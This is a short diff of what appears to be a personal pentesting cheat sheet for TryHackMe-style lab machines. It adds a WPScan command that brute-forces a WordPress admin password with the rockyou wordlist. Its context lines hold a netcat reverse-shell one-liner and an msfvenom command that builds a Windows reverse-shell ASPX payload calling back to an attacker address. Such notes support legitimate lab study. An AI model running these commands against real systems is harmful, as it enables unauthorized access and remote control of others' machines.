@@ -420,6 +420,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.187.74 9000 >/tmp/f
 
 # TO INCORPORATE
 
+# WPScan
+````
+wpscan --url http://internal.thm/blog/ --usernames admin --passwords ~/Bureau/Hack_Tools/Perso-Script/wordlist/rockyou.txt
+````
+
 # Reverse shell on windows 64, aspx file
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.187.74 LPORT=9000 -f aspx > relevant.aspx
 
